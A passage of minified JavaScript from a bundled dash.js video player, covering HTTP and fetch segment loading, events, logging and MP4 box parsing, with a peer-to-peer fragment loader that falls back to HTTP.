",this.XLINK_LOADER_LOADING_FAILURE_ERROR_MESSAGE="Failed loading Xlink element: ",this.SEGMENTS_UPDATE_FAILED_ERROR_MESSAGE="Segments update failed",this.SEGMENTS_UNAVAILABLE_ERROR_MESSAGE="no segments are available yet",this.SEGMENT_BASE_LOADER_ERROR_MESSAGE="error loading segments",this.TIME_SYNC_FAILED_ERROR_MESSAGE="Failed to synchronize time",this.FRAGMENT_LOADER_NULL_REQUEST_ERROR_MESSAGE="request is null",this.URL_RESOLUTION_FAILED_GENERIC_ERROR_MESSAGE="Failed to resolve a valid URL",this.APPEND_ERROR_MESSAGE="chunk is not defined",this.REMOVE_ERROR_MESSAGE="buffer is not defined",this.DATA_UPDATE_FAILED_ERROR_MESSAGE="Data update failed",this.CAPABILITY_MEDIASOURCE_ERROR_MESSAGE="mediasource is not supported",this.CAPABILITY_MEDIAKEYS_ERROR_MESSAGE="mediakeys is not supported",this.TIMED_TEXT_ERROR_MESSAGE_PARSE="parsing error :",this.MEDIASOURCE_TYPE_UNSUPPORTED_MESSAGE="Error creating source buffer of type : "}}let errors=new Errors;const errors_Errors=errors;class DashJSError{constructor(e,t,r){this.code=e||null,this.message=t||null,this.data=r||null}}const vo_DashJSError=DashJSError;function HTTPLoader(e){e=e||{};const t=this.context,r=e.errHandler,s=e.dashMetrics,i=e.mediaPlayerModel,n=e.requestModifier,o=e.boxParser,a=e.useFetch||!1;let h,c,l,u,d;function f(e,h){const _=e.request,p=[];let g,m=!0,E=!0,y=new Date,b=y,S=0;if(!n||!s||!r)throw new Error("config object is not correct or missing");const v=function(e){E=!1,_.requestStartDate=y,_.requestEndDate=new Date,_.firstByteDate=_.firstByteDate||y,_.checkExistenceOnly||(s.addHttpRequest(_,g.response?g.response.responseURL:null,g.response?g.response.status:null,g.response&&g.response.getAllResponseHeaders?g.response.getAllResponseHeaders():g.response?g.response.responseHeaders:[],e?p:null),_.type===HTTPRequest.MPD_TYPE&&s.addManifestUpdate(_.type,_.requestStartDate,_.requestEndDate))},T=function(){if(-1!==c.indexOf(g)&&(c.splice(c.indexOf(g),1),E))if(v(!1),h>0){h--;let t={config:e};u.push(t),t.timeout=setTimeout((function(){-1!==u.indexOf(t)&&(u.splice(u.indexOf(t),1),f(e,h))}),i.getRetryIntervalsForType(_.type))}else r.error(new vo_DashJSError(d[_.type],_.url+" is not available",{request:_,response:g.response})),e.error&&e.error(_,"error",g.response.statusText),e.complete&&e.complete(_,g.response.statusText)};let P;P=a&&window.fetch&&"arraybuffer"===_.responseType&&_.type===HTTPRequest.MEDIA_SEGMENT_TYPE?fetch_loader(t).create({requestModifier:n,boxParser:o}):utils_XHRLoader(t).create({requestModifier:n});const w=n.modifyRequestURL(_.url),R=_.checkExistenceOnly?HTTPRequest.HEAD:HTTPRequest.GET;let A=!1;i.getXHRWithCredentialsForType&&(A=i.getXHRWithCredentialsForType(_.type)),g={url:w,method:R,withCredentials:A,request:_,onload:function(){g.response.status>=200&&g.response.status<=299&&(v(!0),e.success&&e.success(g.response.response,g.response.statusText,g.response.responseURL),e.complete&&e.complete(_,g.response.statusText))},onend:T,onerror:T,progress:function(t){const r=new Date;m&&(m=!1,(!t.lengthComputable||t.lengthComputable&&t.total!==t.loaded)&&(_.firstByteDate=r)),t.lengthComputable&&(_.bytesLoaded=t.loaded,_.bytesTotal=t.total),t.noTrace||(p.push({s:b,d:t.time?t.time:r.getTime()-b.getTime(),b:[t.loaded?t.loaded-S:0]}),b=r,S=t.loaded),e.progress&&t&&e.progress(t)},onabort:function(){e.abort&&e.abort(_)},loader:P,update:e.update,bodyStart:e.bodyStart};let I=(new Date).getTime();if(isNaN(_.delayLoadingTime)||I>=_.delayLoadingTime)c.push(g),P.load(g);else{let e={httpRequest:g};l.push(e),e.delayTimeout=setTimeout((function(){if(-1!==l.indexOf(e)){l.splice(l.indexOf(e),1);try{y=new Date,b=y,c.push(e.httpRequest),P.load(e.httpRequest)}catch(t){e.httpRequest.onerror()}}}),_.delayLoadingTime-I)}}return h={load:function(e){e.request?f(e,i.getRetryAttemptsForType(e.request.type)):e.error&&e.error(e.request,"error")},abort:function(){u.forEach((e=>{clearTimeout(e.timeout),e.config.request&&e.config.abort&&e.config.abort(e.config.request)})),u=[],l.forEach((e=>clearTimeout(e.delayTimeout))),l=[],c.forEach((e=>{e.onloadend=e.onerror=e.onprogress=void 0,e.loader.abort(e)})),c=[]}},c=[],l=[],u=[],d={[HTTPRequest.MPD_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_MANIFEST_CODE,[HTTPRequest.XLINK_EXPANSION_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_XLINK_CODE,[HTTPRequest.INIT_SEGMENT_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_INITIALIZATION_CODE,[HTTPRequest.MEDIA_SEGMENT_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_CONTENT_CODE,[HTTPRequest.INDEX_SEGMENT_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_CONTENT_CODE,[HTTPRequest.BITSTREAM_SWITCHING_SEGMENT_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_CONTENT_CODE,[HTTPRequest.OTHER_TYPE]:errors_Errors.DOWNLOAD_ERROR_ID_CONTENT_CODE},h}HTTPLoader.__dashjs_factory_name="HTTPLoader";const http_loader_factory=core_FactoryMaker.getClassFactory(HTTPLoader),http_loader=http_loader_factory;class FragmentRequest{constructor(e){this.action=FragmentRequest.ACTION_DOWNLOAD,this.startTime=NaN,this.mediaStartTime=NaN,this.mediaType=null,this.mediaInfo=null,this.type=null,this.duration=NaN,this.timescale=NaN,this.range=null,this.url=e||null,this.serviceLocation=null,this.requestStartDate=null,this.firstByteDate=null,this.requestEndDate=null,this.quality=NaN,this.index=NaN,this.availabilityStartTime=null,this.availabilityEndTime=null,this.wallStartTime=null,this.bytesLoaded=NaN,this.bytesTotal=NaN,this.delayLoadingTime=NaN,this.responseType="arraybuffer",this.representationId=null}isInitializationRequest(){return this.type&&this.type===HTTPRequest.INIT_SEGMENT_TYPE}setInfo(e){this.type=e&&e.init?HTTPRequest.INIT_SEGMENT_TYPE:HTTPRequest.MEDIA_SEGMENT_TYPE,this.url=e&&e.url?e.url:null,this.range=e&&e.range?e.range.start+"-"+e.range.end:null,this.mediaType=e&&e.mediaType?e.mediaType:null}}FragmentRequest.ACTION_DOWNLOAD="download",FragmentRequest.ACTION_COMPLETE="complete";const vo_FragmentRequest=FragmentRequest;class HeadRequest extends vo_FragmentRequest{constructor(e){super(e),this.checkForExistenceOnly=!0}}const vo_HeadRequest=HeadRequest;class EventsBase{extend(e,t){if(!e)return;let r=!!t&&t.override,s=!!t&&t.publicOnly;for(const t in e)!e.hasOwnProperty(t)||this[t]&&!r||s&&-1===e[t].indexOf("public_")||(this[t]=e[t])}}const events_EventsBase=EventsBase;class MediaPlayerEvents extends events_EventsBase{constructor(){super(),this.AST_IN_FUTURE="astInFuture",this.BUFFER_EMPTY="bufferStalled",this.BUFFER_LOADED="bufferLoaded",this.BUFFER_LEVEL_STATE_CHANGED="bufferStateChanged",this.DYNAMIC_TO_STATIC="dynamicToStatic",this.ERROR="error",this.FRAGMENT_LOADING_COMPLETED="fragmentLoadingCompleted",this.FRAGMENT_LOADING_PROGRESS="fragmentLoadingProgress",this.FRAGMENT_LOADING_STARTED="fragmentLoadingStarted",this.FRAGMENT_LOADING_ABANDONED="fragmentLoadingAbandoned",this.LOG="log",this.MANIFEST_LOADED="manifestLoaded",this.METRICS_CHANGED="metricsChanged",this.METRIC_CHANGED="metricChanged",this.METRIC_ADDED="metricAdded",this.METRIC_UPDATED="metricUpdated",this.PERIOD_SWITCH_COMPLETED="periodSwitchCompleted",this.PERIOD_SWITCH_STARTED="periodSwitchStarted",this.QUALITY_CHANGE_REQUESTED="qualityChangeRequested",this.QUALITY_CHANGE_RENDERED="qualityChangeRendered",this.TRACK_CHANGE_RENDERED="trackChangeRendered",this.SOURCE_INITIALIZED="sourceInitialized",this.STREAM_INITIALIZING="streamInitializing",this.STREAM_UPDATED="streamUpdated",this.STREAM_INITIALIZED="streamInitialized",this.STREAM_TEARDOWN_COMPLETE="streamTeardownComplete",this.TEXT_TRACKS_ADDED="allTextTracksAdded",this.TEXT_TRACK_ADDED="textTrackAdded",this.TTML_PARSED="ttmlParsed",this.TTML_TO_PARSE="ttmlToParse",this.CAPTION_RENDERED="captionRendered",this.CAPTION_CONTAINER_RESIZE="captionContainerResize",this.CAN_PLAY="canPlay",this.PLAYBACK_ENDED="playbackEnded",this.PLAYBACK_ERROR="playbackError",this.PLAYBACK_NOT_ALLOWED="playbackNotAllowed",this.PLAYBACK_METADATA_LOADED="playbackMetaDataLoaded",this.PLAYBACK_PAUSED="playbackPaused",this.PLAYBACK_PLAYING="playbackPlaying",this.PLAYBACK_PROGRESS="playbackProgress",this.PLAYBACK_RATE_CHANGED="playbackRateChanged",this.PLAYBACK_SEEKED="playbackSeeked",this.PLAYBACK_SEEKING="playbackSeeking",this.PLAYBACK_SEEK_ASKED="playbackSeekAsked",this.PLAYBACK_STALLED="playbackStalled",this.PLAYBACK_STARTED="playbackStarted",this.PLAYBACK_TIME_UPDATED="playbackTimeUpdated",this.PLAYBACK_WAITING="playbackWaiting",this.MANIFEST_VALIDITY_CHANGED="manifestValidityChanged",this.GAP_CAUSED_SEEK_TO_PERIOD_END="gapCausedSeekToPeriodEnd",this.GAP_CAUSED_INTERNAL_SEEK="gapCausedInternalSeek",this.EVENT_MODE_ON_START="eventModeOnStart",this.EVENT_MODE_ON_RECEIVE="eventModeOnReceive",this.CONFORMANCE_VIOLATION="conformanceViolation"}}let mediaPlayerEvents=new MediaPlayerEvents;const streaming_MediaPlayerEvents=mediaPlayerEvents,EVENT_PRIORITY_LOW=0,EVENT_PRIORITY_HIGH=5e3;function EventBus(){let e={};function t(t,r,s){let i=-1;return e[t]?(e[t].some(((e,t)=>{if(e&&e.callback===r&&(!s||s===e.scope))return i=t,!0})),i):i}return{on:function(r,s,i,n={}){if(!r)throw new Error("event type cannot be null or undefined");if(!s||"function"!=typeof s)throw new Error("listener must be a function: "+s);let o=n.priority||EVENT_PRIORITY_LOW;if(t(r,s,i)>=0)return;e[r]=e[r]||[];const a={callback:s,scope:i,priority:o};i&&i.getStreamId&&(a.streamId=i.getStreamId()),i&&i.getType&&(a.mediaType=i.getType()),n&&n.mode&&(a.mode=n.mode),e[r].some(((t,s)=>{if(t&&o>t.priority)return e[r].splice(s,0,a),!0}))||e[r].push(a)},off:function(r,s,i){if(!r||!s||!e[r])return;const n=t(r,s,i);n<0||(e[r][n]=null)},trigger:function(t,r={},s={}){if(t&&e[t]){if((r=r||{}).hasOwnProperty("type"))throw new Error("'type' is a reserved word for event dispatching");r.type=t,s.streamId&&(r.streamId=s.streamId),s.mediaType&&(r.mediaType=s.mediaType),e[t].filter((e=>!!e&&((!s.streamId||!e.streamId||e.streamId===s.streamId)&&((!s.mediaType||!e.mediaType||e.mediaType===s.mediaType)&&!(s.mode&&e.mode&&e.mode!==s.mode||!e.mode&&s.mode&&s.mode===streaming_MediaPlayerEvents.EVENT_MODE_ON_RECEIVE))))).forEach((e=>e&&e.callback.call(e.scope,r)))}},reset:function(){e={}}}}EventBus.__dashjs_factory_name="EventBus";const EventBus_factory=core_FactoryMaker.getSingletonFactory(EventBus);EventBus_factory.EVENT_PRIORITY_LOW=EVENT_PRIORITY_LOW,EventBus_factory.EVENT_PRIORITY_HIGH=EVENT_PRIORITY_HIGH,core_FactoryMaker.updateSingletonFactory(EventBus.__dashjs_factory_name,EventBus_factory);const core_EventBus=EventBus_factory;class CoreEvents extends events_EventsBase{constructor(){super(),this.ATTEMPT_BACKGROUND_SYNC="attemptBackgroundSync",this.BUFFERING_COMPLETED="bufferingCompleted",this.BUFFER_CLEARED="bufferCleared",this.BUFFER_LEVEL_UPDATED="bufferLevelUpdated",this.BYTES_APPENDED="bytesAppended",this.BYTES_APPENDED_END_FRAGMENT="bytesAppendedEndFragment",this.CHECK_FOR_EXISTENCE_COMPLETED="checkForExistenceCompleted",this.CURRENT_TRACK_CHANGED="currentTrackChanged",this.DATA_UPDATE_COMPLETED="dataUpdateCompleted",this.DATA_UPDATE_STARTED="dataUpdateStarted",this.INBAND_EVENTS="inbandEvents",this.INITIALIZATION_LOADED="initializationLoaded",this.INIT_FRAGMENT_LOADED="initFragmentLoaded",this.INIT_FRAGMENT_NEEDED="initFragmentNeeded",this.INTERNAL_MANIFEST_LOADED="internalManifestLoaded",this.ORIGINAL_MANIFEST_LOADED="originalManifestLoaded",this.LIVE_EDGE_SEARCH_COMPLETED="liveEdgeSearchCompleted",this.LOADING_COMPLETED="loadingCompleted",this.LOADING_PROGRESS="loadingProgress",this.LOADING_DATA_PROGRESS="loadingDataProgress",this.LOADING_ABANDONED="loadingAborted",this.MANIFEST_UPDATED="manifestUpdated",this.MEDIA_FRAGMENT_LOADED="mediaFragmentLoaded",this.MEDIA_FRAGMENT_NEEDED="mediaFragmentNeeded",this.QUOTA_EXCEEDED="quotaExceeded",this.REPRESENTATION_UPDATE_STARTED="representationUpdateStarted",this.REPRESENTATION_UPDATE_COMPLETED="representationUpdateCompleted",this.SEGMENTS_LOADED="segmentsLoaded",this.SERVICE_LOCATION_BLACKLIST_ADD="serviceLocationBlacklistAdd",this.SERVICE_LOCATION_BLACKLIST_CHANGED="serviceLocationBlacklistChanged",this.SOURCEBUFFER_REMOVE_COMPLETED="sourceBufferRemoveCompleted",this.STREAMS_COMPOSED="streamsComposed",this.STREAM_BUFFERING_COMPLETED="streamBufferingCompleted",this.STREAM_COMPLETED="streamCompleted",this.TEXT_TRACKS_QUEUE_INITIALIZED="textTracksQueueInitialized",this.TIME_SYNCHRONIZATION_COMPLETED="timeSynchronizationComplete",this.UPDATE_TIME_SYNC_OFFSET="updateTimeSyncOffset",this.URL_RESOLUTION_FAILED="urlResolutionFailed",this.VIDEO_CHUNK_RECEIVED="videoChunkReceived",this.WALLCLOCK_TIME_UPDATED="wallclockTimeUpdated",this.XLINK_ELEMENT_LOADED="xlinkElementLoaded",this.XLINK_READY="xlinkReady",this.SEGMENTBASE_INIT_REQUEST_NEEDED="segmentBaseInitRequestNeeded",this.SEGMENTBASE_SEGMENTSLIST_REQUEST_NEEDED="segmentBaseSegmentsListRequestNeeded",this.SEEK_TARGET="seekTarget"}}const events_CoreEvents=CoreEvents;class Events extends events_CoreEvents{}let Events_events=new Events;const events_Events=Events_events,LOG_LEVEL_NONE=0,LOG_LEVEL_FATAL=1,LOG_LEVEL_ERROR=2,LOG_LEVEL_WARNING=3,LOG_LEVEL_INFO=4,LOG_LEVEL_DEBUG=5;function Debug(e){e=e||{};const t=this.context,r=core_EventBus(t).getInstance(),s=e.settings,i=[];let n,o,a,h;function c(e){return e&&e.bind?e.bind(window.console):window.console.log.bind(window.console)}function l(...e){p(LOG_LEVEL_FATAL,this,...e)}function u(...e){p(LOG_LEVEL_ERROR,this,...e)}function d(...e){p(LOG_LEVEL_WARNING,this,...e)}function f(...e){p(LOG_LEVEL_INFO,this,...e)}function _(...e){p(LOG_LEVEL_DEBUG,this,...e)}function p(e,t,...n){let c="",l=null;o&&(l=(new Date).getTime(),c+="["+(l-h)+"]"),a&&t&&t.getClassName&&(c+="["+t.getClassName()+"]",t.getType&&(c+="["+t.getType()+"]")),c.length>0&&(c+=" "),Array.apply(null,n).forEach((function(e){c+=e+" "})),i[e]&&s.get().debug.logLevel>=e&&i[e](c),s&&s.get().debug.dispatchEvent&&r.trigger(events_Events.LOG,{message:c,level:e})}return n={getLogger:function(e){return{fatal:l.bind(e),error:u.bind(e),warn:d.bind(e),info:f.bind(e),debug:_.bind(e)}},setLogTimestampVisible:function(e){o=e},setCalleeNameVisible:function(e){a=e}},o=!0,a=!0,h=(new Date).getTime(),"undefined"!=typeof window&&window.console&&(i[LOG_LEVEL_FATAL]=c(window.console.error),i[LOG_LEVEL_ERROR]=c(window.console.error),i[LOG_LEVEL_WARNING]=c(window.console.warn),i[LOG_LEVEL_INFO]=c(window.console.info),i[LOG_LEVEL_DEBUG]=c(window.console.debug)),n}Debug.__dashjs_factory_name="Debug";const Debug_factory=core_FactoryMaker.getSingletonFactory(Debug);Debug_factory.LOG_LEVEL_NONE=LOG_LEVEL_NONE,Debug_factory.LOG_LEVEL_FATAL=LOG_LEVEL_FATAL,Debug_factory.LOG_LEVEL_ERROR=LOG_LEVEL_ERROR,Debug_factory.LOG_LEVEL_WARNING=LOG_LEVEL_WARNING,Debug_factory.LOG_LEVEL_INFO=LOG_LEVEL_INFO,Debug_factory.LOG_LEVEL_DEBUG=LOG_LEVEL_DEBUG,core_FactoryMaker.updateSingletonFactory(Debug.__dashjs_factory_name,Debug_factory);const core_Debug=Debug_factory;class IsoBox{constructor(e){if(this.offset=e._offset,this.type=e.type,this.size=e.size,this.boxes=[],e.boxes)for(let t=0;t<e.boxes.length;t++)this.boxes.push(new IsoBox(e.boxes[t]));switch(this.isComplete=!0,e.type){case"sidx":if(this.timescale=e.timescale,this.earliest_presentation_time=e.earliest_presentation_time,this.first_offset=e.first_offset,this.references=e.references,e.references){this.references=[];for(let t=0;t<e.references.length;t++){let r={reference_type:e.references[t].reference_type,referenced_size:e.references[t].referenced_size,subsegment_duration:e.references[t].subsegment_duration};this.references.push(r)}}break;case"emsg":this.id=e.id,this.version=1===e.version?1:0,this.value=e.value,this.timescale=e.timescale,this.scheme_id_uri=e.scheme_id_uri,this.presentation_time_delta=1===e.version?e.presentation_time:e.presentation_time_delta,this.event_duration=e.event_duration,this.message_data=e.message_data;break;case"mdhd":this.timescale=e.timescale;break;case"mfhd":this.sequence_number=e.sequence_number;break;case"subs":this.entry_count=e.entry_count,this.entries=e.entries;break;case"tfhd":this.base_data_offset=e.base_data_offset,this.sample_description_index=e.sample_description_index,this.default_sample_duration=e.default_sample_duration,this.default_sample_size=e.default_sample_size,this.default_sample_flags=e.default_sample_flags,this.flags=e.flags;break;case"tfdt":this.version=e.version,this.baseMediaDecodeTime=e.baseMediaDecodeTime,this.flags=e.flags;break;case"trun":if(this.sample_count=e.sample_count,this.first_sample_flags=e.first_sample_flags,this.data_offset=e.data_offset,this.flags=e.flags,this.samples=e.samples,e.samples){this.samples=[];for(let t=0,r=e.samples.length;t<r;t++){let r={sample_size:e.samples[t].sample_size,sample_duration:e.samples[t].sample_duration,sample_composition_time_offset:e.samples[t].sample_composition_time_offset};this.samples.push(r)}}}}getChildBox(e){for(let t=0;t<this.boxes.length;t++)if(this.boxes[t].type===e)return this.boxes[t]}getChildBoxes(e){let t=[];for(let r=0;r<this.boxes.length;r++)this.boxes[r].type===e&&t.push(this.boxes[r]);return t}}const vo_IsoBox=IsoBox;function IsoFile(){let e,t;function r(e){let r=[];if(!e||!t||"function"!=typeof t.fetchAll)return r;let i,n=t.fetchAll(e);for(let e=0,t=n.length;e<t;e++)i=s(n[e]),i&&r.push(i);return r}function s(e){if(!e)return null;let t=new vo_IsoBox(e);return e.hasOwnProperty("_incomplete")&&(t.isComplete=!e._incomplete),t}return e={getBox:function(e){return e&&t&&t.boxes&&0!==t.boxes.length&&"function"==typeof t.fetch?s(t.fetch(e)):null},getBoxes:r,setData:function(e){t=e},getLastBox:function(){if(!t||!t.boxes||!t.boxes.length)return null;let e=r(t.boxes[t.boxes.length-1].type);return e.length>0?e[e.length-1]:null}},e}IsoFile.__dashjs_factory_name="IsoFile";const utils_IsoFile=core_FactoryMaker.getClassFactory(IsoFile);var iso_boxer=__webpack_require__(100);class IsoBoxSearchInfo{constructor(e,t,r){this.lastCompletedOffset=e,this.found=t,this.size=r}}const vo_IsoBoxSearchInfo=IsoBoxSearchInfo;function BoxParser(){let e,t,r=this.context;function s(e){if(!e)return null;void 0===e.fileStart&&(e.fileStart=0);let t=iso_boxer.parseBuffer(e),s=utils_IsoFile(r).create();return s.setData(t),s}function i(e,t){return e[t+3]>>>0|e[t+2]<<8>>>0|e[t+1]<<16>>>0|e[t]<<24>>>0}function n(e,t){return String.fromCharCode(e[t++])+String.fromCharCode(e[t++])+String.fromCharCode(e[t++])+String.fromCharCode(e[t])}return t={parse:s,findLastTopIsoBoxCompleted:function(e,t,r){if(void 0===r&&(r=0),!t||r+8>=t.byteLength)return new vo_IsoBoxSearchInfo(0,!1);const s=t instanceof ArrayBuffer?new Uint8Array(t):t;let o,a=0;for(;r<s.byteLength;){const t=i(s,r),h=n(s,r+4);if(0===t)break;r+t<=s.byteLength&&(e.indexOf(h)>=0?o=new vo_IsoBoxSearchInfo(r,!0,t):a=r+t),r+=t}return o||new vo_IsoBoxSearchInfo(a,!1)},getMediaTimescaleFromMoov:function(e){let t=s(e),r=t?t.getBox("mdhd"):void 0;return r?r.timescale:NaN},getSamplesInfo:function(e){if(!e||0===e.byteLength)return{sampleList:[],lastSequenceNumber:NaN,totalDuration:NaN,numSequences:NaN};let t,r,i,n,o,a,h,c,l,u,d,f,_,p,g,m,E,y=s(e),b=y.getBoxes("moof"),S=y.getBoxes("mfhd");m=y.getBoxes("moof").length,g=S[S.length-1].sequence_number,i=0,a=[];let v=-1,T=-1;for(d=0;d<b.length;d++){let e=b[d],s=e.getChildBoxes("traf");for(l=0;l<s.length;l++){let d=s[l],g=d.getChildBox("tfhd"),m=d.getChildBox("tfdt");o=m.baseMediaDecodeTime;let y=d.getChildBoxes("trun"),b=d.getChildBoxes("subs");for(u=0;u<y.length;u++){let s=y[u];for(i=s.sample_count,p=(g.base_data_offset||0)+(s.data_offset||0),c=0;c<i;c++){h=s.samples[c],t=void 0!==h.sample_duration?h.sample_duration:g.default_sample_duration,n=void 0!==h.sample_size?h.sample_size:g.default_sample_size,r=void 0!==h.sample_composition_time_offset?h.sample_composition_time_offset:0;let i={dts:o,cts:o+r,duration:t,offset:e.offset+p,size:n,subSizes:[n]};if(b)for(f=0;f<b.length;f++){let e=b[f];if(v<e.entry_count-1&&c>T&&(v++,T+=e.entries[v].sample_delta),c==T){i.subSizes=[];let t=e.entries[v];for(_=0;_<t.subsample_count;_++)i.subSizes.push(t.subsamples[_].subsample_size)}}a.push(i),p+=n,o+=t}}E=o-m.baseMediaDecodeTime}}return{sampleList:a,lastSequenceNumber:g,totalDuration:E,numSequences:m}},findInitRange:function(t){let r,i,n=null;const o=s(t);if(!o)return n;const a=o.getBox("ftyp"),h=o.getBox("moov");return e.debug("Searching for initialization."),h&&h.isComplete&&(r=a?a.offset:h.offset,i=h.offset+h.size-1,n=r+"-"+i,e.debug("Found the initialization.  Range: "+n)),n},parsePayload:function(e,t,r){if(void 0===r&&(r=0),!t||r+8>=t.byteLength)return new vo_IsoBoxSearchInfo(0,!1);const s=t instanceof ArrayBuffer?new Uint8Array(t):t;let o,a=0;for(;r<s.byteLength;){const t=i(s,r),h=n(s,r+4);if(0===t)break;r+t<=s.byteLength&&(e.indexOf(h)>=0?o=new vo_IsoBoxSearchInfo(r,!0,t,h):a=r+t),r+=t}return o||new vo_IsoBoxSearchInfo(a,!1)}},e=core_Debug(r).getInstance().getLogger(t),t}BoxParser.__dashjs_factory_name="BoxParser";const utils_BoxParser=core_FactoryMaker.getSingletonFactory(BoxParser);class SegmentBuilder{constructor(e,t){this.bufferList=[],this.streamListeners=[],this.finished=!1,this.source="HttpStream",this.packetSize=DEFAULT_PACKET_SIZE,this.attachments=t%this.packetSize==0?t/this.packetSize:Math.floor(t/this.packetSize)+1,this.pieceMsg={event:core_events.DC_PIECE,attachments:this.attachments,seg_id:e,size:t}}receiveBytes(e,t){e.byteLength&&(this.bufferList.push(e),t&&(this.finished=!0),this._notifyStreamListeners(e))}destroy(){this.finished||this._notifyStreamListenersAbort()}addStreamListener(e,t,r){this.streamListeners.push({handler:r,peerId:t})}removeStreamListener(e){this.streamListeners=this.streamListeners.filter((t=>t.peerId!==e||(t.handler(void 0,void 0,!0,"aborted by cancel"),!1)))}_notifyStreamListenersAbort(){const{sn:e,seg_id:t}=this.pieceMsg;for(let r of this.streamListeners){const{handler:s}=r;s(e,t,!0,"aborted by httpLoader")}this.streamListeners.length=0}_notifyStreamListeners(e){const{sn:t,seg_id:r}=this.pieceMsg;for(let s of this.streamListeners){const{handler:i}=s;i(t,r,!1,e,this.finished)}this.finished&&(this.streamListeners.length=0)}}function FragLoaderCreator(e,t){return function(r){const s=t.logger;r=r||{};const i=this.context,n=this.factory,o=this.parent,a=fetchSupported(),h=n.getSingletonInstance(i,"EventBus");let c,l;return c={checkForExistence:function(e){const t=function(t){h.trigger(events_Events.CHECK_FOR_EXISTENCE_COMPLETED,{request:e,exists:t})};if(e){let r=new vo_HeadRequest(e.url);l.load({request:r,success:function(){t(!0)},error:function(){t(!1)}})}else t(!1)},load:async function(n){const a=function(e,t){h.trigger(events_Events.LOADING_COMPLETED,{request:n,response:e||null,error:t||null,sender:o})};let c;const u={request:n,progress:function(e){h.trigger(events_Events.LOADING_PROGRESS,{request:n,stream:e.stream}),e.data&&h.trigger(events_Events.LOADING_DATA_PROGRESS,{request:n,response:e.data||null,error:null,sender:o})},success:function(e){a(e)},error:function(e,t,r){a(void 0,new vo_DashJSError(errors_Errors.FRAGMENT_LOADER_LOADING_FAILURE_ERROR_CODE,r,t))},abort:function(e){e&&h.trigger(events_Events.LOADING_ABANDONED,{request:e,mediaType:e.mediaType,sender:o})},onTimeout:function(){}};if(n){if(isNaN(n.index)||!t.isReady)return n.loadByHTTP=!0,void l.load(u);if(t.fetcher.forbidden)return;t.fetcher.increMediaRequests();const o=n.url,a=t.segmentId(o,n.range||void 0);n.segId=a,e.fragMap.has(a)&&(e.currentLevel=e.fragMap.get(a).level),t.scheduler.onFragLoading(a);const h=t.scheduler.getBufferedDuration();if(t.p2pEnabled&&t.bufMgr.hasSegOfId(a)){s.info(`bufMgr found seg ${a}`);let e=t.bufMgr.getSegById(a),r={url:i.url,data:e.data};n.loadByP2P=!0,n.fromPeerId=e.fromPeerId,n.bytesLoaded=n.bytesTotal=r.data.byteLength,s.debug(`bufMgr loaded ${a}`),queue_microtask_default()((()=>{u.success(r.data)}))}else if(t.p2pEnabled&&t.scheduler.hasAndSetTargetPeer(a,h)){let e={Range:n.range},i=n.url;r.requestModifier&&(r.requestModifier.modifyRequestHeader({setRequestHeader:function(t,r){e[t]=r}},{url:i}),i=r.requestModifier.modifyRequestURL(n.url));const o=await t.scheduler.load(a,i,e);if(o&&o.data){if(!t.bufMgr.hasSegOfId(a)){const e=utils_buffer.l.from(o.data),r=new utils_buffer.l(o.data.byteLength);e.copy(r);const s=new Segment(-1,a,r,o.fromPeerId||t.fetcher.peerId);t.bufMgr.putSeg(s)}t.scheduler.onFragLoaded(a,!1),n.bytesLoaded=n.bytesTotal=o.data.byteLength,n.loadByP2P=!0,n.fromPeerId=o.fromPeerId,u.success(o.data)}else s.info(`P2P timeout switched to HTTP load ${a}`),n.loadByP2P=!1,n.loadByHTTP=!0,l&&l.load(u),u.onTimeout()}else{s.info(`HTTP load ${a}`),n.loadByHTTP=!0;const e=u.success;u.success=r=>{if(t.scheduler.segmentBuilderMap.delete(a),!t.bufMgr.hasSegOfId(a)){const e=utils_buffer.l.from(r),s=new utils_buffer.l(r.byteLength);e.copy(s);const i=new Segment(-1,a,s,t.fetcher.peerId);t.bufMgr.putSeg(i)}t.scheduler.onFragLoaded(a,!0),t.fetcher.reportFlow(r.byteLength),s.info(`HTTP loaded ${a}`),e(r)},u.bodyStart=e=>{if(!t.scheduler)return;const{segmentBuilderMap:r}=t.scheduler;e>0&&!c&&(t.scheduler.onHttpBodyStart(a),c=new SegmentBuilder(a,e),r.has(a)||r.set(a,c))},u.update=(e,r,s)=>{if(!t.scheduler)return;const{segmentBuilderMap:i}=t.scheduler;if(s)i.delete(a);else if(c)for(let t=0;t<e.length;t++)c.receiveBytes(e[t],r&&t===e.length-1)},l.load(u)}}else a(void 0,new vo_DashJSError(errors_Errors.FRAGMENT_LOADER_NULL_REQUEST_ERROR_CODE,errors_Errors.FRAGMENT_LOADER_NULL_REQUEST_ERROR_MESSAGE))},abort:function(){l&&l.abort()},reset:function(){l&&(l.abort(),l=null)}},function(){const e=utils_BoxParser(i).getInstance();r.mediaPlayerModel.getXHRWithCredentialsForType||(r.mediaPlayerModel.getXHRWithCredentialsForType=()=>!1),l=http_loader(i).create({errHandler:r.errHandler,dashMetrics:r.dashMetrics,mediaPlayerModel:r.mediaPlayerModel,requestModifier:r.requestModifier,boxParser:e,useFetch:r.settings.get().streaming.lowLatencyEnabled||a})}(),c}}function fetchSupported(){if(window.fetch&&window.AbortController&&window.ReadableStream&&window.Request)try{return new window.ReadableStream({}),!0}catch(e){}return!1}const frag_loader=FragLoaderCreator,isObject=e=>!!e&&"object"==typeof e,merge=(...e)=>e.reduce(((e,t)=>("object"!=typeof t||Object.keys(t).forEach((r=>{Array.isArray(e[r])&&Array.isArray(t[r])?e[r]=e[r].concat(t[r]):isObject(e[r])&&isObject(t[r])?e[r]=merge(e[r],t[r]):e[r]=t[r]})),e)),{}),values=e=>Object.keys(e).map((t=>e[t])),range=(e,t)=>{const r=[];for(let s=e;s<t;s++)r.push(s);return r},flatten=e=>e.reduce(((e,t)=>e.concat(t)),[]),from=e=>{if(!e.length)return[];const t=[];for(let r=0;r<e.length;r++)t.push(e[r]);return t},findIndexes=(e,t)=>e.reduce(((e,r,s)=>(r[t]&&e.push(s),e)),[]),findIndex=(e,t)=>{for(let r=0;r<e.length;r++)if(t(e[r]))return 